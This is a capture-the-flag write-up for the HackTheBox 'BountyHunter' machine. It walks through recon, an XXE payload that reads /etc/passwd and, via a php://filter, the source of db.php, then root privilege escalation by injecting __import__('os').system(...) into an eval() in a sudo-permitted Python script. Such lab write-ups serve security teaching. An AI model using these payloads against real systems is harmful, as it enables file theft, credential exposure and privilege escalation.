# HackTheBox-BountyHunter


## NMAP

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## PORT 80 (HTTP)

<img src="https://i.imgur.com/WXwsvNp.png"/>

We can see this is just an html being used on the webserver , going to portal it says that it's under development

<img src="https://i.imgur.com/mOb05kS.png"/>

Which takes us to Bounty reporting system

<img src="https://i.imgur.com/mbhCBcw.png"/>

But when we submit details to the reporting system it just doesn't get saved

<img src="https://i.imgur.com/oeD6Zz4.png"/>

So here let's try to run `gobuster` and fuzz for files and directories

<img src="https://i.imgur.com/1MGFC3k.png"/>

We can't visit  `/assets` as it's forbidden for us

<img src="https://i.imgur.com/ft3x5Jx.png"/>

Checking the `/resources` folder we do see some files

<img src="https://i.imgur.com/9LFV3fb.png"/>

<img src="https://i.imgur.com/kw7Omg0.png"/>

From `README.txt` it seems that reporting system isn't connected to database also it says about disabling the test account maybe we can login somewhere but for now I don't think there's a login page.

Moving on and checking the the `bountylog.js` we can see a url which points to `tracker_diRbPr00f314.php`

<img src="https://i.imgur.com/BmtnQzh.png"/>

<img src="https://i.imgur.com/ON3oIfh.png"/>

So let's use `burp suite` and try intercepting that reporting system to see if it's actually sending data somewhere 

<img src="https://i.imgur.com/BunaoL8.png"/>

This is making a POST request to that page and sending the data as base64 encoded

<img src="https://i.imgur.com/IzubOeS.png"/>

So this means here we need to do what is called `XXE(XML Xternal Entity)`, what XXE basically allows us to read local files like `/etc/passwd` and sensitive files like php file's source code that the browser doesn't reveal we can steal some information that can be either passwords or some sensitive data . An application that parses XML input . we can add a variable which is called `Entity` that we define inside a `DTD` which is Document Type Definiation  which looks like this 

```xml
<!DOCTYPE arz  [Entity] >
```
The DOCTYPE declaration is where we declare elements, attributes, entities, and notations.


So in DTD we define an entity

```xml
<!ENTITY arz SYSTEM "file:///etc/passwd">
```
This is an external Entity as we are accessing something which isn't declared in the current xml and they are defined with `SYSTEM` keyword

If we combine this together it will look like this 

```xml
<!DOCTYPE test [<!ENTITY arz SYSTEM "file:///etc/passwd"> ]>
```

Now in this scenario our xml input looks like this 

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>SQLI</title>
		<cwe>IDK</cwe>
		<cvss>4.4</cvss>
		<reward>99</reward>
		</bugreport>
```

Including our XXE payload

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE test [<!ENTITY arz SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>&arz;</title>
		<cwe>IDK</cwe>
		<cvss>4.4</cvss>
		<reward>99</reward>
		</bugreport>
```

Notice that `<title>&arz;</title>` this is the variable or the entity that we defined and we are calling that in `title` , so let's base64 encoded it and convert it to url encoding so it can be parsed 

<img src="https://i.imgur.com/P0EFSNp.png"/>

<img src="https://i.imgur.com/Uygm7IS.png"/>

And we have performed XXE and are successful in reading the `/etc/password` file means that we can access that `db.php` as well by using a php filter `php://filter/convert.base64-encode/resource=index.php` that converts the php page to base64 text form as php won't be able to parse base64 encoded text so it will output that page in base64 that we can decode it and see the whole source code


```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
		<bugreport>
		<title>&example;</title>
		<cwe>IDK</cwe>
		<cvss>4.4</cvss>
		<reward>99</reward>
		</bugreport>
```

<img src="https://i.imgur.com/OQyJ2XN.png"/>

<img src="https://i.imgur.com/pEubdhV.png"/>

<img src="https://i.imgur.com/N32ehA1.png"/>

From `/etc/passwd` the only user that has a command shell `bash` is only `development` user so we can try this password through ssh

<img src="https://i.imgur.com/WFDC22G.png"/>

On doing `sudo -l` we can see that we are allowed to run a python script as root

<img src="https://i.imgur.com/vJc6GWX.png"/>

So to break down that python script it's going to first ask for the path of the markdown file `.md` file

<img src="https://i.imgur.com/FuBs9kS.png"/>

And it's going to run `load_file` function

<img src="https://i.imgur.com/VJk1b8t.png"/>

This function will check if the file is ending with markdown extension or not if ti is it's going to open that file and read it , then it's going to return the contents of the file to `evaluate` function

<img src="https://i.imgur.com/VJk1b8t.png"/>

The first part of this code will check if that markdown file starts with `# Skytrain Inc` if not it's going to return false and the program will end else it will continue

The scond part would check if the second line contains `## Ticket to` if not it's going to return false and will end the program else that will continue 

The third will check if the next line of markdown starts with `__Ticket Code:__` or not and will do the same as previously 

The fourth part of this function is important as it will only evaluate the file if those asteriks contain a number that on dividing with `7` it's remainder must be `4` also the number we have in those asteriks must be greate than 100 

Here this is going to split the txt on `+` that will make a list and it's going to take the first argument of that list

<img src="https://i.imgur.com/2ITZAwS.png"/>

Now this part is where we can do code injection

<img src="https://i.imgur.com/WcLPn48.png"/>

So first let's make our markdown file

```
# Skytrain Inc
## Ticket to 
__Ticket Code:__
**102**+__import__('os').system('whoami')
```

We have `102` which on dividing with `7` will give us the remainder `4` and after that we added `+`  and then importing os module to run the shell command `whoami`

So that eval function will have the value `102+__import__('os').system('whoami')` and during runtime it's going to import `os` module in python script and execute the command

<img src="https://i.imgur.com/jeWXljw.png"/>

So we can just replace `whoami` with bash reverse shell

<img src="https://i.imgur.com/BJbco92.png"/>

<img src="https://i.imgur.com/1dRZys0.png"/>

## References

https://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_3-Code-Injections.pdf
